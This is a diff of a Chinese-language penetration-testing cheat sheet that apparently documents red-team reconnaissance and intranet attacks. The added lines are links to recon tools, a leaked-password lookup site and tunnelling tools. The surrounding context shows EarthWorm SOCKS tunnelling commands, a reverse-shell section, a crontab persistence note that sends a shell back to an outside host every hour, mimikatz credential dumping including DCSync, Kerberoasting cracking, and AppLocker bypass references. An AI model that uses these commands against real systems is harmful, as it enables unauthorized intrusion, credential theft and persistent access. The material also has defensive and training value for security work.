@@ -1,6 +1,6 @@
  Author: [Evi1cg](https://twitter.com/Evi1cg) 
  Blog: https://evi1cg.github.io
-  
+
 
 Table of Contents
 =================
@@ -165,6 +165,7 @@ Table of Contents
 * 站长之家:http://whois.chinaz.com/?DomainName=target.com&ws=
 * 爱站:https://whois.aizhan.com/target.com/
 * 微步在线:https://x.threatbook.cn/
+* PassiveTotal:[https://passivetotal.org](https://passivetotal.org)
 * IP反查:https://dns.aizhan.com/
 * 天眼查:https://www.tianyancha.com/
 * 虎妈查:http://www.whomx.com/
@@ -173,7 +174,7 @@ Table of Contents
     * 自搭建:https://github.com/hanc00l/wooyun_publi/
 
 #### google hacking 
- 
+
 ### 创建企业密码字典 
 #### 字典列表 
 * passwordlist:https://github.com/lavalamp-/password-lists
@@ -196,10 +197,12 @@ Table of Contents
 * 获取一个邮箱以后导出通讯录 
 * LinkedInt :https://github.com/mdsecactivebreach/LinkedInt
 * Mailget：https://github.com/Ridter/Mailget
+* Hunter:[https://hunter.io/](https://hunter.io/)
 
 #### 泄露密码查询
 * ghostproject: https://ghostproject.fr/
 * pwndb: https://pwndb2am4tzkvold.onion.to/
+* sjk：[http://site2.sjk.space/](http://site2.sjk.space/)
 
 #### 对企业外部相关信息进行搜集
 ##### 子域名获取 
@@ -207,6 +210,8 @@ Table of Contents
 * subDomainsBrute ：https://github.com/lijiejie/subDomainsBrute
 * wydomain ：https://github.com/ring04h/wydomain
 * Sublist3r ：https://github.com/aboul3la/Sublist3r
+* Teemo：[https://github.com/bit4woo/Teemo](https://github.com/bit4woo/Teemo)
+* aquatone：[https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone)
 * site:target.com:https://www.google.com
 * Github代码仓库 
 * 抓包分析请求返回值(跳转/文件上传/app/api接口等) 
@@ -290,7 +295,7 @@ ls xxx.yyy.cn #列出域信息
 ### Froting 
 * [Domain Fronting ](https://evi1cg.me/archives/Domain_Fronting.html)
 * [Tor_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
-    
+  
 ### 代理 
 * VPN 
 * shadowsockts :https://github.com/shadowsocks
@@ -307,7 +312,7 @@ ls xxx.yyy.cn #列出域信息
     1. [Tunna ](https://github.com/SECFORCE/Tunna)
     2. [Reduh ](https://github.com/sensepost/reDuh)
 * ... 
-    
+  
 ### 内网跨边界代理穿透 
 #### [EW](https://rootkiter.com/EarthWorm/) 
 正向 SOCKS v5 服务器:
@@ -329,7 +334,7 @@ $ ./ew -s rssocks -d 1.1.1.1 -e 8888
 $ ./ew -s lcx_listen -l 1080 -e 8888
 $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
 $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
-``` 
+```
 lcx_tran 的用法
 ```
 $ ./ew -s ssocksd -l 9999
@@ -352,6 +357,8 @@ $ ./ew -s rssocks -d 127.0.0.1 -e 7777
 使用说明:https://rootkiter.com/Termite/README.txt 
 #### 代理脚本 
 reGeorg :https://github.com/sensepost/reGeorg
+
+ABPTTS：[https://github.com/nccgroup/ABPTTS](https://github.com/nccgroup/ABPTTS)
 
 ### shell反弹 
 bash  
@@ -515,7 +522,7 @@ rsync
 远程rsync服务器中拷贝文件到本地机 
 ```
 rsync -av root@192.168.78.192::www /databack
-```   
+```
 本地机器拷贝文件到远程rsync服务器 
 ```
 rsync -av /databack root@192.168.78.192::www
@@ -686,7 +693,7 @@ ftp等
 * [nirsoft_package](http://launcher.nirsoft.net/downloads/)
 * [QuarksPwDump](https://github.com/quarkslab/quarkspwdump) [fgdump](https://github.com/mcandre/fgdump)
 * 星号查看器等
-    
+  
 ##### Linux
 * [LaZagne](https://github.com/AlessandroZ/LaZagne)  
 * [mimipenguin](https://github.com/huntergregal/mimipenguin)
@@ -1079,7 +1086,7 @@ New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.
 ```
 ##### 30、[Password Filter DLL](https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/) 
 ##### 31、[利用BHO实现IE浏览器劫持](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/) 
-        
+
 #### Linux 
 ##### crontab 
 每60分钟反弹一次shell给dns.wuyun.org的53端口
@@ -1385,7 +1392,7 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 
 ```
 mimikatz lsadump::lsa /inject exit 
-``` 
+```
 * 使用PowerShell Mimikatz
 * 使用Mimikatz的DCSync 远程转储Active Directory凭证
 提取 KRBTGT用户帐户的密码数据：
@@ -1469,7 +1476,7 @@ http://wooyun.jozxing.cc/static/drops/tips-13079.html
 * [Responder](https://github.com/SpiderLabs/Responder) 
 * [MITMf](https://github.com/byt3bl33d3r/MITMf) 
 * [3r/MITMf)](https://github.com/evilsocket/bettercap) 
-    
+  
 ### 规避杀软及检测 
 #### Bypass Applocker 
 [UltimateAppLockerByPassList ](https://github.com/api0cradle/UltimateAppLockerByPassList)
